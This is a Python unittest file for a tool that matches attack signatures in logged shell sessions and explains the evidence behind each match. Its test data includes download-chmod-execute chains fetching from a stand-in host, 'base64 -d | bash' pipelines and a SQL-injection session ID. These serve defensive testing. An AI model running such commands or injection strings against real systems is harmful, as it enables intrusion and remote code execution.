from contextlib import closing
import hashlib
import json
from pathlib import Path
import sqlite3
import subprocess
import sys
import tempfile
import unittest

import ingest
from explain_signatures import explain_session
from match_signatures import download_paths, load_rules, match

ROOT = Path(__file__).resolve().parents[1]


def rows(commands):
    return [(f'2026-11-07T00:00:{i:02d}Z', command) for i, command in enumerate(commands)]


class SignatureEvidenceTests(unittest.TestCase):
    def setUp(self):
        self.rules = load_rules(ROOT / 'signatures/rules.yaml')

    def test_same_file_target_and_original_step_references(self):
        cmds = rows(['cd /dev/shm', 'wget example.invalid/p; chmod +x p',
                     'uname -a', 'sudo -S <<< "password" /dev/shm/p'])
        report = explain_session(self.rules, cmds)
        evidence = report['matches'][0]['evidence'][0]
        self.assertEqual(evidence['target'], '/dev/shm/p')
        self.assertEqual(evidence['target_kind'], 'absolute')
        self.assertEqual(evidence['steps'], [
            {'action': 'download', 'command_index': 1},
            {'action': 'chmod', 'command_index': 1},
            {'action': 'execute', 'command_index': 3}])
        self.assertEqual(download_paths(cmds), [[cmds[1], cmds[1], cmds[3]]])
        self.assertEqual(report['execution_status'], 'unverified')
        self.assertEqual(report['input_trust'], 'untrusted')

    def test_legacy_hit_counts_and_compound_path_are_preserved(self):
        line = 'wget example.invalid/p; chmod +x p; ./p'
        cmds = rows([line, line])
        report = explain_session(self.rules, cmds)
        hit = report['matches'][0]
        self.assertEqual((hit['first_ts'], hit['n_hits']), match(self.rules, cmds)['S01'])
        self.assertEqual(len(hit['evidence']), 2)
        self.assertEqual([s['command_index'] for s in hit['evidence'][0]['steps']], [0, 0, 0])
        self.assertEqual(hit['evidence'][0]['target_kind'], 'relative')
        self.assertEqual(report, explain_session(self.rules, [list(row) for row in cmds]))

    def test_mismatched_files_do_not_get_an_explanation(self):
        for commands in [
            ['wget example.invalid/a; chmod +x b; ./a'],
            ['cd /tmp; wget example.invalid/p; chmod +x p', '/var/p'],
        ]:
            with self.subTest(commands=commands):
                self.assertEqual(explain_session(self.rules, rows(commands))['matches'], [])

    def test_decode_evidence_spans_and_matching_row_count(self):
        command = 'echo "한글"; base64 -d 2>/dev/null | bash; base64 --decode input | perl'
        report = explain_session(self.rules, rows([command]))
        hit = report['matches'][0]
        self.assertEqual(hit['rule_id'], 'S02')
        self.assertEqual(hit['n_hits'], 1)
        self.assertEqual(len(hit['evidence']), 2)
        self.assertEqual(report['span_unit'], 'unicode_codepoints_end_exclusive')
        for evidence, decoder, interpreter in zip(
                hit['evidence'], ['base64 -d 2>/dev/null', 'base64 --decode input'], ['bash', 'perl']):
            self.assertEqual(command[slice(*evidence['decoder_span'])].strip(), decoder)
            self.assertEqual(command[slice(*evidence['interpreter_span'])].strip(), interpreter)
            self.assertEqual(evidence['command_index'], 0)

    def test_quoted_and_disconnected_decode_commands_have_no_evidence(self):
        for commands in [['echo "base64 -d | bash"'], ['base64 -d; bash'],
                         ['base64 -d', 'bash'], ['base64 -d | bash local.sh']]:
            with self.subTest(commands=commands):
                self.assertEqual(explain_session(self.rules, rows(commands))['matches'], [])

    def test_cli_is_read_only_and_source_session_scoped(self):
        with tempfile.TemporaryDirectory() as directory:
            db = Path(directory) / 'input.db'
            with closing(sqlite3.connect(db)) as con, con:
                con.executescript(ingest.SCHEMA)
                values = [('a', 'shared', 'wget example.invalid/p'),
                          ('b', 'shared', 'chmod +x p; ./p'),
                          ('a', 'good', 'wget example.invalid/p; chmod +x p; ./p')]
                for source, sid, command in values:
                    con.execute('INSERT INTO commands VALUES (?, ?, ?, ?)',
                                (source, sid, '2026-11-07T00:00:00Z', command))
            before = hashlib.sha256(db.read_bytes()).hexdigest()
            args = [sys.executable, '-B', str(ROOT / 'explain_signatures.py'),
                    '--db', str(db), '--rules', str(ROOT / 'signatures/rules.yaml'), '--source', 'a']
            for sid, expected in [('shared', []), ('good', ['S01']), ('good', ['S01'])]:
                result = subprocess.run(args + ['--session', sid], capture_output=True,
                                        text=True, encoding='utf-8')
                self.assertEqual(result.returncode, 0, result.stderr)
                report = json.loads(result.stdout)
                self.assertEqual([r['rule_id'] for r in report['matches']], expected)
                self.assertEqual(report['source'], 'a')
                self.assertEqual(report['session_id'], sid)
            missing = subprocess.run(args + ['--session', "' OR 1=1 --"], capture_output=True)
            self.assertNotEqual(missing.returncode, 0)
            self.assertEqual(hashlib.sha256(db.read_bytes()).hexdigest(), before)

    def test_cli_does_not_create_a_missing_database(self):
        with tempfile.TemporaryDirectory() as directory:
            db = Path(directory) / 'missing.db'
            result = subprocess.run([sys.executable, '-B', str(ROOT / 'explain_signatures.py'),
                                     '--db', str(db), '--source', 'a', '--session', 'b'],
                                    capture_output=True)
            self.assertNotEqual(result.returncode, 0)
            self.assertFalse(db.exists())


if __name__ == '__main__':
    unittest.main()
